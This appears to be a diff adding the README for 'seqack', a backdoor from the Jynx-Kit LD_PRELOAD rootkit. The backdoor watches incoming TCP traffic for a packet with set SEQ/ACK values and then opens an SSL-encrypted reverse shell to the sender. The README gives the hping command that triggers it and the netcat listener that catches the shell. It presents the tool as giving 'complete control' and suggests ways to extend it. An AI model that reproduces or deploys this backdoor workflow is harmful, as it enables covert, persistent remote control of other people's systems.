@@ -1,0 +1,40 @@
+seqack.c
+
+SEQAck is an SSL encrypted, magic packet triggered reverse connect 
+backdoor application. I wrote this as part of the original 
+Jynx-Kit LD_PRELOAD rootkit, as we released on BlackHat Academy. With 
+the second installation of the rootkit, we moved away from the stand 
+alone sniffing reverse connect, and decided to hook accept() system 
+call. Not only was it simply to demonstrate another example of creating 
+a backdoor, but it also fit perfectly with what we were doing, 
+backdooring the entire system.
+
+This backdoor monitors on the given interface for all incoming TCP 
+packets. It relies on two defines, MAGIC_SEQ and MAGIC_ACK. Once the 
+magic packet is received, it initiates an SSL encrypted reverse 
+connecting backdoor to the host that sent the packet, on the given 
+source port. For example, we can initiate the reverse connect with the 
+following hping command.
+
+# hping -M 0xdead -L 0xbeef google.com -s 5000 -c 1
+
+Notice, the source port is 5000, SEQ (-M) is 0xdead and ACK (-L) is 
+0xbeef. With this example, we'd also need the following nc (netcat 
+supplied with nmap) running in the background to accept the incoming 
+connection.
+
+# nc -l -p 5000 --ssl
+
+And there you have it, the reverse connect shell was successful, and 
+you're in complete control. The idea of using SEQ/ACK values could be 
+applied to a single packet port knock sequence as well, so this 
+application could be easily tweaked, and expanded upon based on your 
+current needs.
+
+
+
+Links:
+BHA: http://www.blackhatacademy.org
+Jynx-Kit: http://www.blackhatacademy.org/security101/Jynx_Rootkit/2.0
+ChokePoint: http://www.chokepoint.net
+
